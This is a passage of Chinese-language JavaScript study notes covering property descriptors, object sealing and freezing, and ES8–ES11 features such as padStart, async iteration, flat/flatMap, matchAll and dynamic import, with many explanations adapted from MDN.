     //{value: 1, writable: true, enumerable: false, configurable: false}
     console.log(Object.getOwnPropertyDescriptor(obj,'a'));
```

【4】Object.defineProperties()

　　Object.defineProperty(o,descriptors)方法用于创建或配置对象的多个属性的描述符，返回配置后的对象

```
     var obj = {
         a:1
     };
     //{a: 1, b: 2}
     console.log(Object.defineProperties(obj,{
             a:{writable:false},
             b:{value:2}
         }));

     //{value: 1, writable: false, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(obj,'a'));
     //{value: 2, writable: false, enumerable: false, configurable: false}
     console.log(Object.getOwnPropertyDescriptor(obj,'b'));
```

【5】Object.create()

　　Object.create(proto,descriptors)方法使用指定的原型和属性来创建一个对象

```
     var o = Object.create(Object.prototype,{
         a:{writable: false,value:1,enumerable:true}
     });
     //{value: 1, writable: false, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(obj,'a'));
```

**描述符详述**

　　前面分别介绍了数据属性和访问器属性的描述符，但没有详细说明其含义及使用，接下来逐一进行说明 

**可写性(writable)**

　　可写性决定是否可以修改属性的值，默认值为true

```
     var o = {a:1};
     o.a = 2;
     console.log(o.a);//2
```

　　设置writable:false后，赋值语句会静默失效

```
     var o = {a:1};
     Object.defineProperty(o,'a',{
         writable:false
     });
     console.log(o.a);//1
     //由于设置了writable为false，所以o.a=2这个语句会静默失效
     o.a = 2;
     console.log(o.a);//1
     Object.defineProperty(o,'a',{
         writable:true
     });
     //由于writable设置为true，所以o.a可以被修改为2
     o.a = 2;
     console.log(o.a);//2
```

　　在严格模式下通过赋值语句为writable为false的属性赋值，会提示类型错误TypeError

```
     'use strict';
     var o = {a:1};
     Object.defineProperty(o,'a',{
         writable:false
     });
     //Uncaught TypeError: Cannot assign to read only property 'a' of object '#<Object>'
     o.a = 2;
```

　　[注意]设置writable:false后，通过Object.defineProperty()方法改变属性value的值不会受影响，因为这也意味着在重置writable的属性值为false

```
     var o = {a:1};
     Object.defineProperty(o,'a',{
         writable:false
     });
     console.log(o.a);//1
     Object.defineProperty(o,'a',{
         value:2
     });
     console.log(o.a);//2
```

**可配置性(Configurable)**

　　可配置性决定是否可以使用delete删除属性，以及是否可以修改属性描述符的特性，默认值为true

　　【1】设置Configurable:false后，无法使用delete删除属性

```
     var o = {a:1};
     Object.defineProperty(o,'a',{
         configurable:false
     });
     delete o.a;//false
     console.log(o.a);//1
```

　　在严格模式下删除为configurable为false的属性，会提示类型错误TypeError

```
     'use strict';
     var o = {a:1};
     Object.defineProperty(o,'a',{
         configurable:false
     });
     //Uncaught TypeError: Cannot delete property 'a' of #<Object>
     delete o.a;
```

　　[注意]使用var命令声明变量时，变量的configurable为false

```
     var a = 1;
     //{value: 1, writable: true, enumerable: true, configurable: false}
     Object.getOwnPropertyDescriptor(this,'a');
```

　　【2】一般地，设置Configurable:false后，将无法再使用defineProperty()方法来修改属性描述符

```
     var o = {a:1};
     Object.defineProperty(o,'a',{
         configurable:false
     });
     //Uncaught TypeError: Cannot redefine property: a
     Object.defineProperty(o,'a',{
         configurable:true
     });
```

　　有一个例外，设置Configurable:false后，只允许writable的状态从true变为false

```
     var o = {a:1};
     Object.defineProperty(o,'a',{
         configurable:false,
         writable:true
     });
     o.a = 2;
     console.log(o.a);//2
     Object.defineProperty(o,'a',{
         writable:false
     });
     //由于writable:false生效，对象a的o属性无法修改值，所以o.a=3的赋值语句静默失败
     o.a = 3;
     console.log(o.a);//2
```

**可枚举性(Enumerable)**

　　可枚举性决定属性是否出现在对象的属性枚举中，具体来说，for-in循环、Object.keys方法、JSON.stringify方法是否会取到该属性

　　用户定义的普通属性默认是可枚举的，而原生继承的属性默认是不可枚举的

```
     //由于原生继承的属性默认不可枚举，所以只取得自定义的属性a:1
     var o = {a:1};
     for(var i in o){
         console.log(o[i]);//1
     }
```

```
     //由于enumerable被设置为false，在for-in循环中a属性无法被枚举出来
     var o = {a:1};
     Object.defineProperty(o,'a',{enumerable:false});
     for(var i in o){
         console.log(o[i]);//undefined
     }
```

propertyIsEnumerable()

　　propertyIsEnumerable()方法用于判断对象的属性是否可枚举

```
     var o = {a:1};
     console.log(o.propertyIsEnumerable('a'));//true
     Object.defineProperty(o,'a',{enumerable:false});
     console.log(o.propertyIsEnumerable('a'));//false
```

**get和set**

　　get是一个隐藏函数，在获取属性值时调用。set也是一个隐藏函数，在设置属性值时调用，它们的默认值都是undefined。Object.definedProperty()中的get和set对应于对象字面量中get和set方法

　　[注意]getter和setter取代了数据属性中的value和writable属性

　　【1】给只设置get方法，没有设置set方法的对象赋值会静默失败，在严格模式下会报错

```
     var o = {
         get a(){
             return 2;
         }
     }    
     console.log(o.a);//2
     //由于没有设置set方法，所以o.a=3的赋值语句会静默失败
     o.a = 3;
     console.log(o.a);//2
```

　　在严格模式下，给没有设置set方法的访问器属性赋值会报错

```
     'use strict';
     var o = {
         get a(){
             return 2;
         }
     }    
     console.log(o.a);//2
     //由于没有设置set方法，所以o.a=3的赋值语句会报错
     //Uncaught TypeError: Cannot set property a of #<Object> which has only a getter
     o.a = 3;
```

```
     'use strict';
     Object.defineProperty(o,'a',{
         get: function(){
             return 2;
         }
     })
     console.log(o.a);//2
     //由于没有设置set方法，所以o.a=3的赋值语句会报错
     //Uncaught TypeError: Cannot set property a of #<Object> which has only a getter
     o.a = 3;
```

　　【2】只设置set方法，而不设置get方法，则对象属性值为undefined

```
     var o = {
         set a(val){
             return 2;
         }
     }    
     o.a = 1;
     console.log(o.a);//undefined
```

```
     Object.defineProperty(o,'a',{
         set: function(){
             return 2;
         }
     })
     o.a = 1;
     console.log(o.a);//undefined
```

　　【3】一般地，set和get方法是成对出现的

```
     var o ={
         get a(){
             return this._a;
         },
         set a(val){
             this._a = val*2;
         }
     }
     o.a = 1;
     console.log(o.a);//2
```

```
     Object.defineProperty(o,'a',{
         get: function(){
             return this._a;
         },
         set :function(val){
             this._a = val*2;
         }
     })
     o.a = 1;
     console.log(o.a);//2
```

对象状态

　　属性描述符只能用来控制对象中一个属性的状态。而如果要控制对象的状态，就要用到下面的6种方法 

**Object.preventExtensions()(禁止扩展)**

　　Object.preventExtensions()方法使一个对象无法再添加新的属性，并返回当前对象

**Object.isExtensible()(测试扩展)**

　　Object.isExtensible()方法用来检测该对象是否可以扩展

```
     var o = {a:1};
     console.log(Object.isExtensible(o));//true
     o.b = 2;
     console.log(o);//{a: 1, b: 2}
     console.log(Object.preventExtensions(o));//{a: 1, b: 2}
     //由于对象o禁止扩展，所以该赋值语句静默失败
     o.c = 3;
     console.log(Object.isExtensible(o));//false
     console.log(o);//{a: 1, b: 2}
```

　　在严格模式下，给禁止扩展的对象添加属性会报TypeError错误

```
     'use strict';
     var o = {a:1};
     console.log(Object.preventExtensions(o));//{a:1}
     //Uncaught TypeError: Can't add property c, object is not extensible
     o.c = 3;
```

　　Object.preventExtensions()方法并不改变对象中属性的描述符状态

```
     var o = {a:1};
     //{value: 1, writable: true, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(o,'a'));
     Object.preventExtensions(o);
     //{value: 1, writable: true, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(o,'a'));
```

**Object.seal()(对象封印)**

　　对象封印又叫对象密封，使一个对象不可扩展并且所有属性不可配置，并返回当前对象

**Object.isSealed()(测试封印)**

　　Object.isSealed()方法用来检测该方法是否被封印

```
     var o = {a:1,b:2};
     console.log(Object.isSealed(o));//false
     console.log(Object.seal(o));//{a:1,b:2}
     console.log(Object.isSealed(o));//true
     console.log(delete o.b);//false
     o.c = 3;
     console.log(o);//{a:1,b:2}
```

　　在严格模式下，删除旧属性或添加新属性都会报错

```
     'use strict';
     var o = {a:1,b:2};
     console.log(Object.seal(o));//{a:1,b:2}
     //Uncaught TypeError: Cannot delete property 'b' of #<Object>
     delete o.b;
```

　　这个方法实际上会在现有对象上调用Object.preventExtensions()方法，并把所有现有属性的configurable描述符置为false

```
     var o = {a:1,b:2};
     //{value: 1, writable: true, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(o,'a'));
     console.log(Object.seal(o));//{a:1,b:2}
     //{value: 1, writable: true, enumerable: true, configurable: false}
     console.log(Object.getOwnPropertyDescriptor(o,'a'));
```

**Object.freeze()(对象冻结)**

　　Object.freeze()方法使一个对象不可扩展，不可配置，也不可改写，变成一个仅可以枚举的只读常量，并返回当前对象

**Object.isFrozen()(检测冻结)**

　　Object.isFrozen()方法用来检测一个对象是否被冻结

```
     var o = {a:1,b:2};
     console.log(Object.isFrozen(o));//false
     console.log(Object.freeze(o));//{a:1,b:2}
     console.log(Object.isFrozen(o));//true
     o.a = 3;
     console.log(o);//{a:1,b:2}
```

　　在严格模式下，删除旧属性、添加新属性、更改现有属性都会报错

```
     'use strict';
     var o = {a:1,b:2};
     console.log(Object.freeze(o));//{a:1,b:2}
     //Uncaught TypeError: Cannot assign to read only property 'a' of object '#<Object>'
     o.a = 3;
```

　　这个方法实际上会在现有对象上调用Object.seal()方法，并把所有现有属性的writable描述符置为false

```
     var o = {a:1};
     //{value: 1, writable: true, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(o,'a'));
     console.log(Object.freeze(o));//{a:1}
     //{value: 1, writable: false, enumerable: true, configurable: false}
     console.log(Object.getOwnPropertyDescriptor(o,'a'));
```

##### 字符串扩展

###### String.prototype.padStart()

> **`padStart()`** 方法用另一个字符串填充当前字符串(如果需要的话，会重复多次)，以便产生的字符串达到给定的长度。从当前字符串的左侧开始填充。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padStart#语法)

```
str.padStart(targetLength [, padString])
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padStart#参数)

- `targetLength`

  当前字符串需要填充到的目标长度。如果这个数值小于当前字符串的长度，则返回当前字符串本身。

- `padString` 可选

  填充字符串。如果字符串太长，使填充后的字符串长度超过了目标长度，则只保留最左侧的部分，其他部分会被截断。此参数的默认值为 " "（U+0020）。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padStart#返回值)

在原字符串开头填充指定的填充字符串直到目标长度所形成的新字符串。

**基本使用：**

```
     'abc'.padStart(10);         // "       abc"
     'abc'.padStart(10, "foo");  // "foofoofabc"
     'abc'.padStart(6,"123465"); // "123abc"
     'abc'.padStart(8, "0");     // "00000abc"
     'abc'.padStart(1);          // "abc"
```

**应用：**

```
	// yyyy-mm-dd  2020-04-01
      const now = new Date()
      const year = now.getFullYear()
      console.log((now.getMonth() + 1));
      const month = new String(now.getMonth() + 1).padStart(2, '0')   //0-11
      const day = new String(now.getDate()).padStart(2, '0')
      console.log(year + '-' + month + '-' + day)		
```

###### String.prototype.padEnd()

> **`padEnd()`** 方法会用一个字符串填充当前字符串（如果需要的话则重复填充），返回填充后达到指定长度的字符串。从当前字符串的末尾（右侧）开始填充。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padEnd#语法)

```
str.padEnd(targetLength [, padString])
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padEnd#参数)

- `targetLength`

  当前字符串需要填充到的目标长度。如果这个数值小于当前字符串的长度，则返回当前字符串本身。

- `padString` 可选

  填充字符串。如果字符串太长，使填充后的字符串长度超过了目标长度，则只保留最左侧的部分，其他部分会被截断。此参数的缺省值为 " "（U+0020）。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padEnd#返回值)

在原字符串末尾填充指定的填充字符串直到目标长度所形成的新字符串。

**基本使用：**

```
     'abc'.padEnd(10);          // "abc       "
     'abc'.padEnd(10, "foo");   // "abcfoofoof"
     'abc'.padEnd(6, "123456"); // "abc123"
     'abc'.padEnd(1);           // "abc"
```

**应用：**

```
	const tel = '13138745417'
	const newTel = tel.slice(-4).padStart(tel.length, '*')
	console.log(newTel)       // *******5417
```

###### 字符串伪逗号

> 允许函数参数列表使用伪逗号，也就是我们一个对象中最后的属性其实是不能加逗号了的，但是这个新特性就允许加多一个逗号，平时开发注意即可

#### ES9

##### 异步迭代

> 之前我们学的迭代器都是同步的，那么假设有异步的需要迭代呢？

###### Symbol.asyncIterator 

> 当我们给对象新设置这么一个属性，这个就是异步迭代器

###### for-await-of

> 如果我们使用for...of遍历的话，那么会去使用同步的迭代器，
>
> 使用for-await-of遍历就会使用上面的异步迭代器Symbol.asyncIterator ，并且会等待每个返回的Promise状态变为resolved才继续迭代下一个，具体使用如下

```
function getPromise(time) {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            resolve({
                value: time,
                done: false
            })
        }, time)
    })
}
const arr = [getPromise(1000), getPromise(2000), getPromise(3000)]
arr[Symbol.asyncIterator] = function () {
    let nextIndex = 0
    return {
        next() {
            return nextIndex < arr.length ? arr[nextIndex++] :
                Promise.resolve({
                    value: undefined,
                    done: true
                })
        }
    }
}
async function test() {
    for await (let item of arr) {
        console.log(item)
    }
}
test()
```

##### 正则表达式扩展

###### dotAll

```
const reg1 = /./
const reg2 = /./s              //开启dotAll模式
console.log(reg1.test('\n'))   //false
console.log(reg2.test('\n'))   //true
```

##### 对象扩展

###### Rest参数

> 用来合并数组是属于深拷贝，如果解析参数的话只能放置后边

```
const {name, age, ...rest1} = {name: 'web', age: 18, sex: '男',height: 1.7}
console.log(rest1)    // {sex: '男', height: 1.7}
const [a,b,...rest2] = [1,2,3,4]
console.log(rest2)    // [3,4]

const arr = [...[1,2],...[3,4]]
console.log(arr)      // [ 1, 2, 3, 4 ]
const obj = {...{name: 'web',age: 18}, ...{sex: '男'}}
console.log(obj)      // { name: 'web', age: 18, sex: '男' }
```

##### Promise扩展

###### Promise.prototype.finally()

> `finally()` 方法返回一个[`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)。在promise结束时，无论结果是fulfilled或者是rejected，都会执行指定的回调函数。这为在`Promise`是否成功完成后都需要执行的代码提供了一种方式。
>
> 这避免了同样的语句需要在[`then()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)和[`catch()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)中各写一次的情况。

由于无法知道`promise`的最终状态，所以`finally`的回调函数中不接收任何参数，它仅用于无论最终结果如何都要执行的情况

#### ES10

##### 对象扩展

###### Object.fromEntries()

>  `Object.fromEntries()` 方法把键值对列表转换为一个对象。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/fromEntries#语法)

```
Object.fromEntries(iterable);
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/fromEntries#参数)

- `iterable`

  类似 [`Array`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array) 、 [`Map`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map) 或者其它实现了[可迭代协议](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols#the_iterable_protocol)的可迭代对象。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/fromEntries#返回值)

一个由该迭代对象条目提供对应属性的新对象。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/fromEntries#描述)

`Object.fromEntries()` 方法接收一个键值对的列表参数，并返回一个带有这些键值对的新对象。这个迭代参数应该是一个能够实现`@@iterator`方法的的对象，返回一个迭代器对象。它生成一个具有两个元素的类数组的对象，第一个元素是将用作属性键的值，第二个元素是与该属性键关联的值。

`Object.fromEntries()` 执行与 [`Object.entries`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/entries) 互逆的操作。

基本使用：

```
     const obj = {
       name: 'imooc',
       course: 'es'
     }
     const entries = Object.entries(obj)
     console.log(entries);                          //[['name', 'imooc'], ['course', 'es']]

     const fromEntries = Object.fromEntries(entries)
     console.log(fromEntries);                      //{ name: 'imooc', course: 'es' }

     const map = new Map()
     map.set('name', 'imooc')
     map.set('course', 'es')
     console.log(map);                              //Map(2) { 'name' => 'imooc', 'course' => 'es' }
     const mapFromEntries = Object.fromEntries(map)
     console.log(mapFromEntries);                   //{ name: 'imooc', course: 'es' }

     //应用一
     const course = {
       math: 80,
       english: 85,
       chinese: 90
     }
     const res = Object.entries(course).filter(([key, val]) => val > 80)   
     console.log(res);                              //[ [ 'english', 85 ], [ 'chinese', 90 ] ]
     console.log(Object.fromEntries(res));          //{ english: 85, chinese: 90 }
```

##### 字符串扩展

###### String.prototype.trimRight()

> `trimEnd() `方法从一个字符串的末端移除空白字符。trimRight() 是这个方法的别名。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#syntax)

```
str.trimEnd();
str.trimRight();
```

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#返回值)

一个新字符串，表示从调用字串的末（右）端除去空白。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#description)

`trimEnd()` / `trimRight()`方法移除原字符串右端的连续空白符并返回，`trimEnd()` / `trimRight()`方法并不会直接修改原字符串本身。

[别名](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#别名)

为了与 [`String.prototype.padEnd`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padEnd) 等函数保持一致，标准方法名称为`trimEnd`。 但是，出于Web兼容性原因，`trimRight`仍然是`trimEnd`的别名。 在某些引擎中，这意味着：

```
String.prototype.trimRight.name === "trimEnd";
```

Copy to Clipboard

[示例](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#examples)

[使用`trimEnd()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimEnd#使用trimend)

下面的例子输出了小写的字符串"  foo":

```
var str = "   foo  ";
alert(str.length); // 8

str = str.trimRight();  // 或写成str = str.trimEnd();
console.log(str.length); // 6
console.log(str);       // '   foo'
```

###### String.prototype.trimStart()

> **`trimStart()`** 方法从字符串的开头删除空格。`trimLeft()` 是此方法的别名。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimStart#语法)

```
str.trimStart();
str.trimLeft();
```

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimStart#返回值)

一个新字符串，表示从其开头（左端）除去空格的调用字符串。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimStart#描述)

`trimStart()` / `trimLeft()` 方法移除原字符串左端的连续空白符并返回一个新字符串，并不会直接修改原字符串本身。

[别名](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimStart#别名)

为了与 [`String.prototype.padStart`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/padStart) 等函数保持一致，标准方法名称为`trimStart`。 但是，出于 Web 兼容性原因，`trimLeft` 仍然是 `trimStart` 的别名。在某些引擎中，这意味着：

```
String.prototype.trimLeft.name === "trimStart";
```

Copy to Clipboard

[示例](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimStart#示例)

[使用 `trimStart()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/trimStart#使用_trimstart)

下面的例子输出了小写的字符串 `"foo "`：

```
var str = "   foo  ";

console.log(str.length); // 8

str = str.trimStart()    // 等同于 str = str.trimLeft();
console.log(str.length); // 5
console.log(str);        // "foo  "
```

###### Array.prototype.flat()

> `flat()` 方法会按照一个可指定的深度递归遍历数组，并将所有元素与遍历到的子数组中的元素合并为一个新数组返回。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#语法)

```
var newArray = arr.flat([depth])
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#参数)

- `depth` 可选

  指定要提取嵌套数组的结构深度，默认值为 1。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#返回值)

一个包含将数组与子数组中所有元素的新数组。

[示例](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#示例)

[扁平化嵌套数组](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#扁平化嵌套数组)

```
var arr1 = [1, 2, [3, 4]];
arr1.flat();
// [1, 2, 3, 4]

var arr2 = [1, 2, [3, 4, [5, 6]]];
arr2.flat();
// [1, 2, 3, 4, [5, 6]]

var arr3 = [1, 2, [3, 4, [5, 6]]];
arr3.flat(2);
// [1, 2, 3, 4, 5, 6]

//使用 Infinity，可展开任意深度的嵌套数组
var arr4 = [1, 2, [3, 4, [5, 6, [7, 8, [9, 10]]]]];
arr4.flat(Infinity);
// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
```

[扁平化与数组空项](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#扁平化与数组空项)

`flat()` 方法会移除数组中的空项:

```
var arr4 = [1, 2, , 4, 5];
arr4.flat();
// [1, 2, 4, 5]
```

[替代方案](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#替代方案)

[使用 `reduce` 与 `concat`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#使用_reduce_与_concat)

```
var arr = [1, 2, [3, 4]];

// 展开一层数组
arr.flat();
// 等效于
arr.reduce((acc, val) => acc.concat(val), []);
// [1, 2, 3, 4]

// 使用扩展运算符 ...
const flattened = arr => [].concat(...arr);
```

###### Array.prototype.flatMap()

> `flatMap()` 方法首先使用映射函数映射每个元素，然后将结果压缩成一个新数组。它与 [map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map) 连着深度值为1的 [flat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/flat) 几乎相同，但 `flatMap` 通常在合并成一种方法的效率稍微高一些。

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flatMap#参数)

- `callback`

  可以生成一个新数组中的元素的函数，可以传入三个参数：`currentValue`当前正在数组中处理的元素`index`可选可选的。数组中正在处理的当前元素的索引。`array`可选可选的。被调用的 `map` 数组

- `thisArg`可选

  可选的。执行 `callback` 函数时 使用的`this` 值。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flatMap#返回值)

 一个新的数组，其中每个元素都是回调函数的结果，并且结构深度 `depth` 值为1。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flatMap#描述)

有关回调函数的详细描述，请参见 [`Array.prototype.map()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map) 。 `flatMap` 方法与 `map` 方法和深度depth为1的 `flat` 几乎相同.

[示例](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flatMap#示例)

[`map()` 与 `flatMap()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flatMap#map_与_flatmap)

```
var arr1 = [1, 2, 3, 4];

arr1.map(x => [x * 2]);
// [[2], [4], [6], [8]]

arr1.flatMap(x => [x * 2]);
// [2, 4, 6, 8]

// only one level is flattened
arr1.flatMap(x => [[x * 2]]);
// [[2], [4], [6], [8]]
```

虽然上面的代码使用 map 和 flatMap 好像都可以，但这只能展示如何使用 flatMap。

所以，为了更好的展示 flatMap 的作用，下面我们将包含几句话的数组拆分成单个词组成的新数组。

```
let arr1 = ["it's Sunny in", "", "California"];

arr1.map(x => x.split(" "));
// [["it's","Sunny","in"],[""],["California"]]

arr1.flatMap(x => x.split(" "));
// ["it's","Sunny","in", "", "California"]
```

注意，输出列表长度可以不同于输入列表长度。

##### 修订Function.prototype.toString()

> 返回源代码中的实际文本片段，旧的标准不会返回函数的注释和空格这些，但是ES10标准会原封不动的返回

##### 可选的Catch Binding

> 可省略catch绑定的参数

这是传统的写法，但代码实际运行过程中，我们有时候并不需要把错误输出出来，那么我们就可以不给catch传参数了

![image-20210829003349014](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210829003349.png)

简洁的新写法：

![](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210829003638.png)

#### ES11

##### 字符串扩展

###### String.prototype.matchAll()

> **`matchAll()`** 方法返回一个包含所有匹配正则表达式的结果及分组捕获组的迭代器。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll#语法)

```
str.matchAll(regexp)
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll#参数)

- `regexp`

  正则表达式对象。如果所传参数不是一个正则表达式对象，则会隐式地使用 `new RegExp(obj)` 将其转换为一个 [`RegExp`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp) 。

  `RegExp`必须是设置了全局模式`g`的形式，否则会抛出异常`TypeError`。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll#返回值)

一个迭代器（不可重用，结果耗尽需要再次调用方法，获取一个新的迭代器）。

[例子](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll#例子)

[Regexp.exec() 和 matchAll()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll#regexp.exec_和_matchall)

在 `matchAll` 出现之前，通过在循环中调用 `regexp.exec()` 来获取所有匹配项信息（regexp 需使用 `/g` 标志）：

```
const regexp = RegExp('foo[a-z]*','g');
const str = 'table football, foosball';
let match;

while ((match = regexp.exec(str)) !== null) {
  console.log(`Found ${match[0]} start=${match.index} end=${regexp.lastIndex}.`);
  // expected output: "Found football start=6 end=14."
  // expected output: "Found foosball start=16 end=24."
}
```

如果使用 `matchAll` ，就可以不必使用 while 循环加 exec 方式（且正则表达式需使用 `/g` 标志）。使用 `matchAll` 会得到一个迭代器的返回值，配合 `for...of`, [array spread](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax), 或者 [`Array.from()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from) 可以更方便实现功能：

```
const regexp = RegExp('foo[a-z]*','g');
const str = 'table football, foosball';
const matches = str.matchAll(regexp);

for (const match of matches) {
  console.log(`Found ${match[0]} start=${match.index} end=${match.index + match[0].length}.`);
}
// expected output: "Found football start=6 end=14."
// expected output: "Found foosball start=16 end=24."

// matches iterator is exhausted after the for..of iteration
// Call matchAll again to create a new iterator
Array.from(str.matchAll(regexp), m => m[0]);
// Array [ "football", "foosball" ]
```

如果没有 `/g` 标志，`matchAll` 会抛出异常。

```
const regexp = RegExp('[a-c]','');
const str = 'abc';
Array.from(str.matchAll(regexp), m => m[0]);
// TypeError: String.prototype.matchAll called with a non-global RegExp argument
```

`matchAll` 内部做了一个 regexp 的复制，所以不像 [regexp.exec](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec), `lastIndex` 在字符串扫描时不会改变。

```
const regexp = RegExp('[a-c]','g');
regexp.lastIndex = 1;
const str = 'abc';
Array.from(str.matchAll(regexp), m => `${regexp.lastIndex} ${m[0]}`);
// Array [ "1 b", "1 c" ]
```

[捕获组的更佳途径](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll#捕获组的更佳途径)

`matchAll` 的另外一个亮点是更好地获取捕获组。因为当使用 `match()` 和 `/g` 标志方式获取匹配信息时，捕获组会被忽略：

```
var regexp = /t(e)(st(\d?))/g;
var str = 'test1test2';

str.match(regexp);
// Array ['test1', 'test2']
```

使用 `matchAll` 可以通过如下方式获取分组捕获:

```
let array = [...str.matchAll(regexp)];

array[0];
// ['test1', 'e', 'st1', '1', index: 0, input: 'test1test2', length: 4]
array[1];
// ['test2', 'e', 'st2', '2', index: 5, input: 'test1test2', length: 4]
```

##### Dynamic import()动态导入

> 按需import提案几年前就已提出，如今终于能进入ES正式规范。这里个人理解成“按需”更为贴切。现代前端打包资源越来越大，打包成几M的JS资源已成常态，
>
> 而往往前端应用初始化时根本不需要全量加载逻辑资源，为了首屏渲染速度更快，很多时候都是按需加载，比如懒加载图片等。而这些按需执行逻辑资源都体现在某一个事件回调中去加载。

```
// 点击按钮才去加载ajax模块
const oBtn = document.querySelector('#btn')
oBtn.addEventListener('click', () => {
    import('./ajax').then(mod => {
        mod.get('static/a.json', res => {
            console.log(res)
        })
    })
})
```

当然，`webpack`目前已很好的支持了该特性。

Vue 中组件按需加载：

```
const routes = [
  {
    path: '/',
    name: 'User',
    component: User
  }, {
    path: '/upload',
    name: 'Upload',
    component: () => import('../views/Upload.vue')
  }
]
```

当我们build打包项目后，会把不同路由的页面分成一个个JS文件，按需请求加载

![image-20210830011340066](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210830011340.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210830005506.png" alt="image-20210830005505572" style="zoom:67%;" />



##### BigInt

